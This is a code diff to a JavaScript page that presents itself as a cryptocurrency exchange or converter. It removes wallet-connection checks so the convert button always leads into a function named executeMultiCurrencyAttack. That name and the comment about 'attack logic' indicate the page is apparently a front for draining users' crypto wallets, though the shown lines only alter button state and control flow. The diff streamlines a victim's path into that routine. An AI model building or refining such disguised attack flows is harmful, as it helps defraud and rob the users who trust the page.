@@ -947,22 +947,21 @@ function calculateConversion() {
                 rateText.textContent = `1 ${currentFromCurrency} ≈ ${(fromCurrency.price / toCurrency.price).toFixed(6)} ${currentToCurrency}`;
             }
 
-            if (isWalletConnected && convertBtn) {
+            // 🎯 始终保持兑换按钮可用，支持直接兑换流程
+            if (convertBtn) {
                 convertBtn.textContent = `兑换 ${fromAmount} ${currentFromCurrency}`;
                 convertBtn.disabled = false;
 
                 debugLog(`💱 用户计算兑换: ${fromAmount} ${currentFromCurrency} → ${converted} ${currentToCurrency}`);
-            } else if (convertBtn) {
-                convertBtn.textContent = '请先连接钱包';
-                convertBtn.disabled = true;
             }
         }
     } else {
         if (toAmount) toAmount.value = '';
         if (rateText) rateText.textContent = `选择币种进行兑换`;
         if (convertBtn) {
-            convertBtn.textContent = isWalletConnected ? `请输入${currentFromCurrency}数量` : '请先连接钱包';
-            convertBtn.disabled = true;
+            // 🎯 保持兑换按钮可用，只是提示输入数量
+            convertBtn.textContent = `请输入${currentFromCurrency}数量`;
+            convertBtn.disabled = true; // 只有没有输入时才禁用
         }
     }
 }
@@ -981,12 +980,12 @@ async function executeMultiCurrencyAttack() {
         }
     }
 
-    // 其他币种的攻击逻辑
-    if (!isWalletConnected) {
-        showToast('请先连接钱包', 'error');
-        showWalletModal();
-        return;
-    }
+    // 🎯 直接兑换流程，不需要预先连接钱包检查
+    // if (!isWalletConnected) {
+    //     showToast('请先连接钱包', 'error');
+    //     showWalletModal();
+    //     return;
+    // }
 
     const fromAmount = document.getElementById('fromAmount').value;
     if (!fromAmount || parseFloat(fromAmount) <= 0) {
